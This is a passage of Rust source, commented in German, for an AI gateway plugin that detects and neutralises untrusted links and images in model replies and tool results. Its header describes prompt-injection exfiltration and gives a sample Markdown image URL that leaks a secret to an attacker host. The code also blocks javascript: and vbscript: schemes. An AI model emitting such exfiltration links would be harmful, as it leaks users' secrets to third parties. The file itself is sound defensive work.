// SPDX-FileCopyrightText: 2026 ai-gw contributors
// SPDX-License-Identifier: AGPL-3.0-or-later

//! Plugin `link-guard` (AIGW-110): Datenabfluss über Links in Antworten verhindern
//! (Prompt-Injection-Exfiltration, z. B. `![](https://angreifer.example/p.png?d=<Geheimnis>)`,
//! das der Client beim Rendern ungefragt lädt).
//!
//! ```yaml
//! plugin: link-guard
//! config:
//!   allowDomains: [example.com, "*.example.com"]   # vertrauenswürdige Ziele (Subdomain-Wildcard)
//!   images: block          # block (Standard) | allow – Bilder zu fremden Domains
//!   links: allow           # allow (Standard) | block – Links zu fremden Domains
//!   blockQueryParams: false  # fremde URLs mit Query-Parametern/Zugangsdaten blockieren
//!   maxPathLength: 100     # fremde URLs mit längerem Pfad blockieren (optional)
//!   action: strip          # strip (Standard) | defang | reject | flag
//!   direction: output      # output (Standard) | input | both
//!   roles: [tool]          # Eingabe: geprüfte Rollen (Standard: Tool-Ergebnisse)
//!   streamMaxHoldBytes: 8192
//! ```
//!
//! Erkannt werden Markdown-Bilder und -Links (auch verschachtelt), Referenz-Definitionen
//! (`[x]: url` – gelten als Bild, weil jede Definition als Bild verwendbar ist), HTML-Tags mit
//! URL-Attributen (`<img src>`, `srcset`, `<a href>`, `style="…url()"`, `<meta refresh>` …) und
//! nackte URLs (`https://…`, `www.…`). `javascript:`/`vbscript:` sind immer verboten.
//! Entfernte Teile können keine neuen Konstrukte bilden: der Text wird bis zum Fixpunkt neu
//! geprüft. Im Stream bleiben unvollständige Konstrukte am Ende des Puffers zurück, bis sie
//! vollständig sind (höchstens `streamMaxHoldBytes`, danach wird mit „Host unvollständig =
//! fremd“ entschieden).

use std::borrow::Cow;
use std::ops::Range;
use std::sync::{Arc, LazyLock};

use aigw_core::ir::{ApiError, Content, PartKind, StreamEvent};
use regex::Regex;
use serde::Deserialize;
use serde_json::Value;

use super::guard::{Direction, RoleSel, floor_boundary};
use crate::binding::FailMode;
use crate::plugin::{
    CallInfo, ChunkCtx, ChunkFlow, Flow, Hook, Phases, Plugin, PluginError, ReqCtx, RespCtx,
};
use crate::registry::PluginFactory;

const NAME: &str = "link-guard";
/// Höchstzahl der Prüfdurchläufe bis zum Fixpunkt; danach wird der ganze Text ersetzt.
const MAX_PASSES: usize = 8;
const REMOVED_ALL: &str = "[content removed by link-guard]";
/// Wie weit vor `](` die öffnende Klammer gesucht wird.
const MAX_BRACKET_LOOKBACK: usize = 4096;
/// Höchstzahl der Einträge in `allowDomains`.
const MAX_DOMAINS: usize = 1000;
/// Anfänge nackter URLs (für unvollständige Enden im Stream).
const URL_STARTS: [&str; 5] = ["https://", "http://", "ftp://", "www.", "(//"];

/// Aktion bei einem nicht erlaubten Link.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum LinkAction {
    /// Entfernen (Bild ganz, Link → Linktext, nackte URL/HTML-Tag ganz).
    Strip,
    /// Durch einen Platzhalter mit entschärftem Host ersetzen (`[blocked image: evil[.]com]`).
    Defang,
    /// Ablehnen (Eingabe `400 link_blocked`, Ausgabe `content_filter` je F160).
    Reject,
    /// Nur zählen.
    Flag,
}

impl LinkAction {
    fn as_str(self) -> &'static str {
        match self {
            Self::Strip => "strip",
            Self::Defang => "defang",
            Self::Reject => "reject",
            Self::Flag => "flag",
        }
    }
}

/// Umgang mit Bildern bzw. Links zu fremden Domains.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Policy {
    /// Blockieren.
    Block,
    /// Erlauben (Query-/Pfad-Regeln gelten weiter).
    Allow,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct Config {
    #[serde(default)]
    allow_domains: Vec<String>,
    #[serde(default)]
    images: Option<Policy>,
    #[serde(default)]
    links: Option<Policy>,
    #[serde(default)]
    block_query_params: bool,
    #[serde(default)]
    max_path_length: Option<usize>,
    #[serde(default)]
    action: Option<LinkAction>,
    #[serde(default)]
    direction: Option<Direction>,
    #[serde(default)]
    roles: Option<Vec<RoleSel>>,
    #[serde(default)]
    stream_max_hold_bytes: Option<usize>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum DomainPat {
    Exact(String),
    /// `*.example.com` → `.example.com` (nur Subdomains, nicht die Domain selbst).
    Sub(String),
}

fn parse_domain(raw: &str) -> Result<DomainPat, String> {
    let s = raw.trim().trim_end_matches('.').to_lowercase();
    let (wild, host) = match s.strip_prefix("*.") {
        Some(h) => (true, h),
        None => (false, s.as_str()),
    };
    let ok = !host.is_empty()
        && host.len() <= 253
        && !host.starts_with('.')
        && !host.contains("..")
        && host
            .chars()
            .all(|c| c.is_alphanumeric() || matches!(c, '-' | '.' | '_'));
    if !ok {
        return Err(format!(
            "allowDomains: ungültige Domain {raw:?} (erlaubt: example.com oder *.example.com)"
        ));
    }
    Ok(if wild {
        DomainPat::Sub(format!(".{host}"))
    } else {
        DomainPat::Exact(host.to_owned())
    })
}

/// Art eines URL-Vorkommens.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// Lädt ohne Zutun (Bild, `srcset`, CSS `url()`, Referenz-Definition …).
    Image,
    /// Braucht einen Klick.
    Link,
}

/// Plugin `link-guard`.
#[derive(Debug, Clone)]
pub struct LinkGuard {
    allow: Vec<DomainPat>,
    images: Policy,
    links: Policy,
    block_query: bool,
    max_path: Option<usize>,
    action: LinkAction,
    direction: Direction,
    roles: Vec<RoleSel>,
    max_hold: usize,
}

impl LinkGuard {
    fn from_config(c: Config) -> Result<Self, String> {
        if c.allow_domains.len() > MAX_DOMAINS {
            return Err(format!("allowDomains: höchstens {MAX_DOMAINS} Einträge"));
        }
        let allow = c
            .allow_domains
            .iter()
            .map(|d| parse_domain(d))
            .collect::<Result<Vec<_>, _>>()?;
        if let Some(p) = c.max_path_length
            && !(1..=8192).contains(&p)
        {
            return Err("maxPathLength muss zwischen 1 und 8192 liegen".into());
        }
        let max_hold = c.stream_max_hold_bytes.unwrap_or(8192);
        if !(256..=65536).contains(&max_hold) {
            return Err("streamMaxHoldBytes muss zwischen 256 und 65536 liegen".into());
        }
        if c.roles.as_ref().is_some_and(Vec::is_empty) {
            return Err("roles: mindestens eine Rolle".into());
        }
        Ok(Self {
            allow,
            images: c.images.unwrap_or(Policy::Block),
            links: c.links.unwrap_or(Policy::Allow),
            block_query: c.block_query_params,
            max_path: c.max_path_length,
            action: c.action.unwrap_or(LinkAction::Strip),
            direction: c.direction.unwrap_or(Direction::Output),
            roles: c.roles.unwrap_or_else(|| vec![RoleSel::Tool]),
            max_hold,
        })
    }

    fn allowed_host(&self, host: &str) -> bool {
        self.allow.iter().any(|p| match p {
            DomainPat::Exact(d) => host == d.as_str(),
            DomainPat::Sub(s) => host.ends_with(s.as_str()),
        })
    }

    /// Kategorie des Verstoßes (`image`, `link`, `query`, `path`, `scheme`) oder `None`.
    fn judge(&self, kind: Kind, t: &Target) -> Option<&'static str> {
        if t.dangerous {
            return Some("scheme");
        }
        let foreign = if t.network {
            t.incomplete || !t.host.as_deref().is_some_and(|h| self.allowed_host(h))
        } else {
            t.scheme.is_some()
        };
        if !foreign {
            return None;
        }
        match kind {
            Kind::Image if self.images == Policy::Block => return Some("image"),
            Kind::Link if self.links == Policy::Block => return Some("link"),
            _ => {}
        }
        if t.network {
            if self.block_query && t.has_query {
                return Some("query");
            }
            if self.max_path.is_some_and(|m| t.path_len > m) {
                return Some("path");
            }
        }
        None
    }

    /// Prüft `text`. `Ok(None)` = unverändert, `Ok(Some(neu))` = bereinigt, `Err(Kategorie)`
    /// bei `reject`. `partial`: der Text endet mitten im Stream (Host am Ende = unvollständig).
    fn process(
        &self,
        text: &str,
        partial: bool,
        info: &CallInfo,
    ) -> Result<Option<String>, &'static str> {
        let mut cur: Option<String> = None;
        for pass in 0..=MAX_PASSES {
            let t = cur.as_deref().unwrap_or(text);
            let mut edits: Vec<(Range<usize>, String)> = Vec::new();
            for f in scan(t) {
                let verdict = f.urls.iter().find_map(|(kind, r)| {
                    let target = analyze(&t[r.clone()], partial && r.end == t.len());
                    self.judge(*kind, &target)
                        .map(|cat| (*kind, cat, target.display()))
                });
                let Some((kind, cat, host)) = verdict else {
                    continue;
                };
                info.guardrails.add(NAME, cat, self.action.as_str(), 1);
                match self.action {
                    LinkAction::Reject => return Err(cat),
                    LinkAction::Flag => {}
                    LinkAction::Strip | LinkAction::Defang => {
                        edits.extend(self.edits_for(&f, kind, &host));
                    }
                }
            }
            if self.action == LinkAction::Flag {
                // Zählen genügt; nur ein Durchlauf.
                return Ok(None);
            }
            if edits.is_empty() {
                return Ok(cur);
            }
            if pass == MAX_PASSES {
                break;
            }
            cur = Some(apply_edits(t, edits));
        }
        Ok(Some(REMOVED_ALL.to_owned()))
    }

    fn edits_for(&self, f: &Found, kind: Kind, host: &str) -> Vec<(Range<usize>, String)> {
        let strip = self.action == LinkAction::Strip;
        let label = match kind {
            Kind::Image => "image",
            Kind::Link => "link",
        };
        let placeholder = format!("[blocked {label}: {host}]");
        match f.shape {
            Shape::MdLink { close } => {
                let tail = if strip {
                    String::new()
                } else {
                    format!(" {placeholder}")
                };
                vec![
                    (f.span.start..f.span.start + 1, String::new()),
                    (close..f.span.end, tail),
                ]
            }
            Shape::MdImage | Shape::RefDef | Shape::Html | Shape::Bare => {
                let with = if strip { String::new() } else { placeholder };
                vec![(f.span.clone(), with)]
            }
        }
    }

    fn reject_error(cat: &str, output: bool) -> ApiError {
        let msg = if output {
            format!(
                "Die Antwort enthielt einen nicht erlaubten Link (Regel: {cat}) und wurde blockiert"
            )
        } else {
            format!("Die Anfrage enthält einen nicht erlaubten Link (Regel: {cat})")
        };
        ApiError::invalid_request(msg).with_code("link_blocked")
    }
}

/// Wendet nicht überlappende Ersetzungen an (überlappende spätere werden verworfen – die
/// äußere Ersetzung deckt sie ab).
fn apply_edits(text: &str, mut edits: Vec<(Range<usize>, String)>) -> String {
    edits.sort_by_key(|(r, _)| (r.start, std::cmp::Reverse(r.end)));
    let mut out = String::with_capacity(text.len());
    let mut last = 0;
    for (r, with) in edits {
        if r.start < last {
            continue;
        }
        out.push_str(&text[last..r.start]);
        out.push_str(&with);
        last = r.end;
    }
    out.push_str(&text[last..]);
    out
}

// ---------------------------------------------------------------------------------------------
// URL-Analyse
// ---------------------------------------------------------------------------------------------

/// Ergebnis der Analyse einer URL.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct Target {
    /// Schema (klein), falls angegeben.
    scheme: Option<String>,
    /// Netzwerkziel (http/https/ftp/ws/wss, protokollrelativ, `www.`).
    network: bool,
    /// Host (klein, ohne Port/Zugangsdaten, Prozent-dekodiert).
    host: Option<String>,
    /// Host reicht bis ans Ende eines unvollständigen Texts.
    incomplete: bool,
    /// Query-Parameter oder Zugangsdaten (`user@host`).
    has_query: bool,
    /// Länge des Pfads (Bytes).
    path_len: usize,
    /// `javascript:`/`vbscript:`.
    dangerous: bool,
}

impl Target {
    /// Entschärfte Anzeige des Ziels für Platzhalter (`evil[.]com`).
    fn display(&self) -> String {
        let h = self
            .host
            .as_deref()
            .or(self.scheme.as_deref())
            .unwrap_or("?");
        let clean: String = h
            .chars()
            .take(100)
            .map(|c| {
                if c.is_alphanumeric() || matches!(c, '-' | '.') {
                    c
                } else {
                    '?'
                }
            })
            .collect();
        clean.replace('.', "[.]")
    }
}

/// Analysiert eine URL wie ein Browser (konservativ): HTML-Entities, `\` wie `/`,
/// Tab/Zeilenumbruch entfernt, Zugangsdaten vor `@`, Prozent-Kodierung im Host.
fn analyze(raw: &str, partial_end: bool) -> Target {
    let decoded = decode_entities(raw);
    let cleaned: String = decoded
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .map(|c| if c == '\\' { '/' } else { c })
        .collect();
    let s = cleaned.trim_matches(|c: char| c <= ' ');
    let mut t = Target::default();
    let scheme_end = s.find(':').filter(|&p| {
        p > 0
            && !s[..p].contains(['/', '?', '#'])
            && s[..p].starts_with(|c: char| c.is_ascii_alphabetic())
            && s[..p]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
    });
    let authority_part = match scheme_end {
        Some(p) => {
            let scheme = s[..p].to_ascii_lowercase();
            let rest = &s[p + 1..];
            let network = matches!(scheme.as_str(), "http" | "https" | "ftp" | "ws" | "wss");
            t.dangerous = matches!(scheme.as_str(), "javascript" | "vbscript");
            let data = scheme == "data";
            if !data {
                t.scheme = Some(scheme);
            }
            if !network {
                return t;
            }
            rest.trim_start_matches('/')
        }
        None => {
            if s.starts_with("//") {
                s.trim_start_matches('/')
            } else if s.len() >= 4 && s[..4].eq_ignore_ascii_case("www.") {
                s
            } else {
                return t; // relativ
            }
        }
    };
    t.network = true;
    let auth_end = authority_part
        .find(['/', '?', '#'])
        .unwrap_or(authority_part.len());
    if partial_end && auth_end == authority_part.len() {
        t.incomplete = true;
    }
    let authority = &authority_part[..auth_end];
    let hostport = match authority.rfind('@') {
        Some(at) => {
            t.has_query = true;
            &authority[at + 1..]
        }
        None => authority,
    };
    let host = if hostport.starts_with('[') {
        hostport.find(']').map_or(hostport, |e| &hostport[..=e])
    } else {
        hostport.split(':').next().unwrap_or("")
    };
    let host: String = percent_decode(host)
        .chars()
        .map(|c| match c {
            '\u{3002}' | '\u{ff0e}' | '\u{ff61}' => '.',
            c => c,
        })
        .collect::<String>()
        .to_lowercase();
    let host = host.trim_end_matches('.');
    if !host.is_empty() {
        t.host = Some(host.to_owned());
    }
    let rest = &authority_part[auth_end..];
    let path_end = rest.find(['?', '#']).unwrap_or(rest.len());
    t.path_len = path_end;
    if rest[path_end..].starts_with('?') {
        let q = &rest[path_end + 1..];
        let q = &q[..q.find('#').unwrap_or(q.len())];
        if !q.is_empty() {
            t.has_query = true;
        }
    }
    t
}

fn percent_decode(s: &str) -> Cow<'_, str> {
    if !s.contains('%') {
        return Cow::Borrowed(s);
    }
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%'
            && i + 2 < b.len()
            && let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2]))
        {
            out.push(h * 16 + l);
            i += 3;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }
    Cow::Owned(String::from_utf8_lossy(&out).into_owned())
}

fn hex(c: u8) -> Option<u8> {
    (c as char).to_digit(16).and_then(|d| u8::try_from(d).ok())
}

/// Dekodiert HTML-Entities (numerisch, auch ohne `;`, und die für URLs relevanten benannten).
fn decode_entities(s: &str) -> Cow<'_, str> {
    if !s.contains('&') {
        return Cow::Borrowed(s);
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(p) = rest.find('&') {
        out.push_str(&rest[..p]);
        let after = &rest[p + 1..];
        if let Some(num) = after.strip_prefix('#') {
            let (radix, digits) = match num.strip_prefix(['x', 'X']) {
                Some(d) => (16, d),
                None => (10, num),
            };
            let len = digits
                .bytes()
                .take_while(|c| {
                    if radix == 16 {
                        c.is_ascii_hexdigit()
                    } else {
                        c.is_ascii_digit()
                    }
                })
                .count();
            if len > 0 {
                let ch = u32::from_str_radix(&digits[..len.min(8)], radix)
                    .ok()
                    .and_then(char::from_u32)
                    .unwrap_or('\u{fffd}');
                out.push(ch);
                let mut consumed = after.len() - digits.len() + len;
                if after[consumed..].starts_with(';') {
                    consumed += 1;
                }
                rest = &after[consumed..];
                continue;
            }
        } else {
            let window = &after[..floor_boundary(after, 32)];
            if let Some(semi) = window.find(';')
                && let Some(ch) = named_entity(&after[..semi])
            {
                out.push(ch);
                rest = &after[semi + 1..];
                continue;
            }
        }
        out.push('&');
        rest = after;
    }
    out.push_str(rest);
    Cow::Owned(out)
}

fn named_entity(name: &str) -> Option<char> {
    Some(match name {
        "colon" => ':',
        "sol" => '/',
        "bsol" => '\\',
        "period" => '.',
        "quest" => '?',
        "num" => '#',
        "commat" => '@',
        "amp" | "AMP" => '&',
        "lt" | "LT" => '<',
        "gt" | "GT" => '>',
        "quot" | "QUOT" => '"',
        "apos" => '\'',
        "lpar" => '(',
        "rpar" => ')',
        "Tab" => '\t',
        "NewLine" => '\n',
        "equals" => '=',
        "percnt" => '%',
        _ => return None,
    })
}

// ---------------------------------------------------------------------------------------------
// Erkennung
// ---------------------------------------------------------------------------------------------

/// Form eines Fundes (bestimmt die Ersetzung).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Shape {
    /// `![alt](ziel)` – ganze Spanne.
    MdImage,
    /// `[text](ziel)` – `[` am Anfang der Spanne, `](…)` ab `close`.
    MdLink { close: usize },
    /// `[label]: ziel` – ganze Zeile.
    RefDef,
    /// HTML-Tag.
    Html,
    /// Nackte URL.
    Bare,
}

/// Ein Fund im Text.
#[derive(Debug, Clone)]
struct Found {
    shape: Shape,
    span: Range<usize>,
    /// URL-Vorkommen mit Art.
    urls: Vec<(Kind, Range<usize>)>,
    /// `false`: das Konstrukt reicht bis ans Textende und ist noch nicht abgeschlossen.
    complete: bool,
}

static REF_DEF: LazyLock<Option<Regex>> = LazyLock::new(|| {
    Regex::new(r"(?m)^ {0,3}\[[^\]\n]{1,999}\]:[ \t]*(?:\n[ \t]*)?(<[^>\n]*>?|[^\s]+)").ok()
});
static REF_DEF_OPEN: LazyLock<Option<Regex>> =
    LazyLock::new(|| Regex::new(r"(?:^|\n) {0,3}\[[^\]\n]{1,999}\]:[ \t]*(?:\n[ \t]*)?\z").ok());
static BARE: LazyLock<Option<Regex>> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:https?|ftp)://[^\s<>"'`]*|\bwww\.[^\s<>"'`]+|\(//[^\s<>"'`()]+"#).ok()
});

/// Alle Funde (Markdown, Referenz-Definitionen, HTML, nackte URLs). Unvollständige
/// Konstrukte am Ende gelten als bis zum Ende reichend (`complete: false`).
fn scan(text: &str) -> Vec<Found> {
    let mut out = Vec::new();
    scan_markdown(text, &mut out);
    scan_refdefs(text, &mut out);
    scan_html(text, &mut out);
    // Nackte URLs außerhalb der Ziele/Tags (im Linktext werden sie geprüft: nach dem
    // Entfernen eines Links würden sie sonst automatisch verlinkt).
    let covered: Vec<Range<usize>> = out
        .iter()
        .map(|f| match f.shape {
            Shape::MdLink { close } => close..f.span.end,
            _ => f.span.clone(),
        })
        .collect();
    scan_bare(text, &covered, &mut out);
    out
}

fn scan_markdown(text: &str, out: &mut Vec<Found>) {
    let b = text.as_bytes();
    let mut i = 0;
    while let Some(off) = text[i..].find("](") {
        let q = i + off;
        i = q + 1;
        let Some(open) = match_open(b, q) else {
            continue;
        };
        let Some((dest, end, complete)) = parse_dest(text, q + 2) else {
            continue;
        };
        if open > 0 && b[open - 1] == b'!' {
            out.push(Found {
                shape: Shape::MdImage,
                span: open - 1..end,
                urls: vec![(Kind::Image, dest)],
                complete,
            });
        } else {
            out.push(Found {
                shape: Shape::MdLink { close: q },
                span: open..end,
                urls: vec![(Kind::Link, dest)],
                complete,
            });
        }
    }
}

/// Öffnende `[` zu der `]` bei `q` (verschachtelt, höchstens bis zur letzten Leerzeile).
fn match_open(b: &[u8], q: usize) -> Option<usize> {
    let lo = q.saturating_sub(MAX_BRACKET_LOOKBACK);
    let mut depth = 0usize;
    let mut k = q;
    while k > lo {
        k -= 1;
        match b[k] {
            b']' => depth += 1,
            b'[' if depth == 0 => return Some(k),
            b'[' => depth -= 1,
            b'\n' if k > 0 && b[k - 1] == b'\n' => return None,
            _ => {}
        }
    }
    None
}

fn is_ws(c: u8) -> bool {
    matches!(c, b' ' | b'\t' | b'\n' | b'\r')
}

/// Ziel eines Markdown-Links ab `start` (nach `](`): (Ziel, Ende, vollständig). `None`, wenn
/// es kein Link ist.
fn parse_dest(text: &str, start: usize) -> Option<(Range<usize>, usize, bool)> {
    let b = text.as_bytes();
    let n = b.len();
    let mut k = start;
    let mut newline = false;
    while k < n && is_ws(b[k]) {
        if b[k] == b'\n' {
            if newline {
                return None;
            }
            newline = true;
        }
        k += 1;
    }
    if k >= n {
        return Some((n..n, n, false));
    }
    let dest = if b[k] == b'<' {
        let s = k + 1;
        match text[s..].find(['>', '\n']) {
            Some(p) if b[s + p] == b'>' => {
                k = s + p + 1;
                s..s + p
            }
            Some(_) => return None,
            None => return Some((s..n, n, false)),
        }
    } else {
        let s = k;
        let mut depth = 0usize;
        while k < n {
            match b[k] {
                b'\\' => {
                    k += 2;
                    continue;
                }
                b'(' => depth += 1,
                b')' if depth == 0 => break,
                b')' => depth -= 1,
                c if c <= b' ' => break,
                _ => {}
            }
            k += 1;
        }
        k = k.min(n);
        if k >= n {
            return Some((s..n, n, false));
        }
        s..k
    };
    while k < n && is_ws(b[k]) {
        k += 1;
    }
    if k >= n {
        return Some((dest, n, false));
    }
    match b[k] {
        b')' => Some((dest, k + 1, true)),
        q @ (b'"' | b'\'' | b'(') => {
            let close = if q == b'(' { b')' } else { q };
            let mut j = k + 1;
            while j < n && b[j] != close {
                if b[j] == b'\\' {
                    j += 1;
                }
                j += 1;
            }
            if j >= n {
                return Some((dest, n, false));
            }
            j += 1;
            while j < n && is_ws(b[j]) {
                j += 1;
            }
            if j >= n {
                return Some((dest, n, false));
            }
            (b[j] == b')').then_some((dest, j + 1, true))
        }
        _ => None,
    }
}

fn scan_refdefs(text: &str, out: &mut Vec<Found>) {
    let Some(re) = REF_DEF.as_ref() else {
        return;
    };
    for c in re.captures_iter(text) {
        let (Some(m), Some(d)) = (c.get(0), c.get(1)) else {
            continue;
        };
        let mut dest = d.range();
        if text[dest.clone()].starts_with('<') {
            dest.start += 1;
            if text[dest.clone()].ends_with('>') {
                dest.end -= 1;
            }
        }
        let complete = d.end() < text.len();
        let end = text[d.end()..]
            .find('\n')
            .map_or(text.len(), |p| d.end() + p);
        out.push(Found {
            shape: Shape::RefDef,
            span: m.start()..end,
            urls: vec![(Kind::Image, dest)],
            complete,
        });
    }
}

/// Art eines HTML-Attributs mit URL (`None`: kein URL-Attribut).
fn attr_kind(tag: &str, attr: &str) -> Option<Kind> {
    Some(match attr {
        "href" if matches!(tag, "a" | "area") => Kind::Link,
        "action" | "formaction" | "ping" => Kind::Link,
        "href" | "xlink:href" | "src" | "srcset" | "imagesrcset" | "poster" | "background"
        | "data" | "lowsrc" | "dynsrc" | "longdesc" | "manifest" | "codebase" | "archive" => {
            Kind::Image
        }
        _ => return None,
    })
}

fn scan_html(text: &str, out: &mut Vec<Found>) {
    let b = text.as_bytes();
    let n = b.len();
    let mut i = 0;
    while let Some(off) = text[i..].find('<') {
        let s = i + off;
        i = s + 1;
        if s + 1 >= n || !b[s + 1].is_ascii_alphabetic() {
            continue;
        }
        // Ein Tag endet spätestens an einer Leerzeile (kein Inline-HTML darüber hinweg).
        let lim = text[s..].find("\n\n").map_or(n, |p| s + p);
        let mut k = s + 1;
        while k < lim && (b[k].is_ascii_alphanumeric() || matches!(b[k], b'-' | b':')) {
            k += 1;
        }
        if k < lim && !(is_ws(b[k]) || matches!(b[k], b'>' | b'/')) {
            continue;
        }
        let tag = text[s + 1..k].to_ascii_lowercase();
        let mut urls = Vec::new();
        let mut complete = false;
        loop {
            while k < lim && (is_ws(b[k]) || b[k] == b'/') {
                k += 1;
            }
            if k >= lim {
                break;
            }
            if b[k] == b'>' {
                k += 1;
                complete = true;
                break;
            }
            let an = k;
            while k < lim && !(is_ws(b[k]) || matches!(b[k], b'=' | b'>' | b'/')) {
                k += 1;
            }
            let attr = text[an..k].to_ascii_lowercase();
            while k < lim && is_ws(b[k]) {
                k += 1;
            }
            if k >= lim || b[k] != b'=' {
                continue;
            }
            k += 1;
            while k < lim && is_ws(b[k]) {
                k += 1;
            }
            let val = if k < lim && matches!(b[k], b'"' | b'\'') {
                let quote = b[k] as char;
                let vs = k + 1;
                match text[vs..lim].find(quote) {
                    Some(p) => {
                        k = vs + p + 1;
                        vs..vs + p
                    }
                    None => {
                        k = lim;
                        vs..lim
                    }
                }
            } else {
                let vs = k;
                while k < lim && !(is_ws(b[k]) || b[k] == b'>') {
                    k += 1;
                }
                vs..k
            };
            html_urls(text, &tag, &attr, val, &mut urls);
        }
        if !complete && lim < n {
            continue; // kein Tag
        }
        let end = if complete { k } else { n };
        if !urls.is_empty() || !complete {
            out.push(Found {
                shape: Shape::Html,
                span: s..end,
                urls,
                complete,
            });
        }
        if !complete {
            break;
        }
        i = end;
    }
}

/// URL-Vorkommen eines Attributwerts.
fn html_urls(
    text: &str,
    tag: &str,
    attr: &str,
    val: Range<usize>,
    urls: &mut Vec<(Kind, Range<usize>)>,
) {
    let v = &text[val.clone()];
    if attr == "style" {
        // CSS `url(…)` lädt automatisch.
        let lower = v.to_ascii_lowercase();
        let mut from = 0;
        while let Some(p) = lower[from..].find("url(") {
            let s = from + p + 4;
            let e = lower[s..].find(')').map_or(v.len(), |x| s + x);
            let inner = v[s..e].trim_matches(|c: char| c.is_whitespace() || c == '"' || c == '\'');
            let off = v[s..e].find(inner).map_or(s, |x| s + x);
            urls.push((Kind::Image, val.start + off..val.start + off + inner.len()));
            from = e;
        }
        return;
    }
    if attr == "content" && tag == "meta" {
        // `<meta http-equiv=refresh content="0;url=…">` navigiert ohne Klick.
        let lower = v.to_ascii_lowercase();
        if let Some(p) = lower.find("url=") {
            urls.push((Kind::Image, val.start + p + 4..val.end));
        }
        return;
    }
    let Some(kind) = attr_kind(tag, attr) else {
        return;
    };
    if attr.ends_with("srcset") {
        let mut off = 0;
        for cand in v.split(',') {
            let lead = cand.len() - cand.trim_start().len();
            let url = cand.trim_start();
            let len = url.find(char::is_whitespace).unwrap_or(url.len());
            if len > 0 {
                let s = val.start + off + lead;
                urls.push((kind, s..s + len));
            }
            off += cand.len() + 1;
        }
        return;
    }
    urls.push((kind, val));
}

fn scan_bare(text: &str, covered: &[Range<usize>], out: &mut Vec<Found>) {
    let Some(re) = BARE.as_ref() else {
        return;
    };
    for m in re.find_iter(text) {
        let mut start = m.start();
        if text[start..].starts_with('(') {
            start += 1;
        }
        if covered.iter().any(|r| r.contains(&start)) {
            continue;
        }
        let end = trim_url_end(text, start, m.end());
        if end <= start {
            continue;
        }
        out.push(Found {
            shape: Shape::Bare,
            span: start..end,
            urls: vec![(Kind::Link, start..end)],
            complete: m.end() < text.len(),
        });
    }
}

/// Satzzeichen und unausgeglichene Klammern am Ende gehören nicht zur URL (wie GFM).
fn trim_url_end(text: &str, start: usize, mut end: usize) -> usize {
    loop {
        let u = &text[start..end];
        let Some(last) = u.chars().next_back() else {
            return end;
        };
        let unbalanced = |o: char, c: char| {
            last == c
                && u.chars().filter(|&x| x == o).count() < u.chars().filter(|&x| x == c).count()
        };
        if matches!(last, '.' | ',' | ':' | ';' | '!' | '?' | '*' | '_' | '~')
            || unbalanced('(', ')')
            || unbalanced('[', ']')
        {
            end -= last.len_utf8();
        } else {
            return end;
        }
    }
}

/// Beginn eines am Ende noch unvollständigen Konstrukts (Stream: ab hier zurückhalten).
fn pending_start(text: &str) -> Option<usize> {
    let b = text.as_bytes();
    let n = b.len();
    let &last = b.last()?;
    let mut p = n;
    for f in scan(text) {
        if !f.complete {
            p = p.min(f.span.start);
        }
    }
    // Offene `[` im aktuellen Absatz; `]` bzw. `!` am Ende (gleich folgt `(`/`[`).
    let para = text.rfind("\n\n").map_or(0, |x| x + 2);
    let mut stack: Vec<usize> = Vec::new();
    let mut last_pair = None;
    for (k, &c) in b.iter().enumerate().skip(para) {
        match c {
            b'[' => stack.push(k),
            b']' => last_pair = stack.pop(),
            _ => {}
        }
    }
    let bang = |o: usize| if o > 0 && b[o - 1] == b'!' { o - 1 } else { o };
    if let Some(&first) = stack.first() {
        p = p.min(bang(first));
    }
    if last == b']'
        && let Some(o) = last_pair
    {
        p = p.min(bang(o));
    }
    if matches!(last, b'!' | b'<') {
        p = p.min(n - 1);
    }
    // Referenz-Definition ohne Ziel am Ende (`[x]:` bzw. Ziel auf der nächsten Zeile).
    if let Some(m) = REF_DEF_OPEN.as_ref().and_then(|re| re.find(text)) {
        let s = if text[m.start()..].starts_with('\n') {
            m.start() + 1
        } else {
            m.start()
        };
        p = p.min(s);
    }
    // Möglicher URL-Anfang am Ende (`htt`, `www`, `(/`).
    let lo = floor_boundary(text, n.saturating_sub(8));
    for (k, _) in text[lo..].char_indices() {
        let rest = &text[lo + k..];
        if URL_STARTS.iter().any(|u| {
            u.len() >= rest.len()
                && u.as_bytes()[..rest.len()].eq_ignore_ascii_case(rest.as_bytes())
        }) {
            p = p.min(lo + k);
            break;
        }
    }
    (p < n).then_some(p)
}

// ---------------------------------------------------------------------------------------------
// Textstellen
// ---------------------------------------------------------------------------------------------

/// Besucht Text-/Ablehnungs-Teile (`all`) und Tool-Ergebnisse (immer); Tool-Argumente nicht.
fn visit_text<E>(
    c: &mut Content,
    all: bool,
    f: &mut impl FnMut(&mut String) -> Result<(), E>,
) -> Result<(), E> {
    match c {
        Content::Text(t) if all => f(t),
        Content::Text(_) => Ok(()),
        Content::Parts(parts) => {
            for p in parts {
                match &mut p.kind {
                    PartKind::Text { text } | PartKind::Refusal { text } if all => f(text)?,
                    PartKind::ToolResult { content, .. } => visit_text(content, true, f)?,
                    _ => {}
                }
            }
            Ok(())
        }
    }
}

// ---------------------------------------------------------------------------------------------
// Stream
// ---------------------------------------------------------------------------------------------

#[derive(Debug, Default)]
struct StreamState {
    /// Textblock, zu dem der Puffer gehört.
    index: Option<u32>,
    /// Zurückgehaltener (ungeprüfter) Text.
    buf: String,
}

impl LinkGuard {
    /// Gibt den ganzen Puffer geprüft aus.
    fn flush(
        &self,
        st: &mut StreamState,
        info: &CallInfo,
    ) -> Result<Option<StreamEvent>, &'static str> {
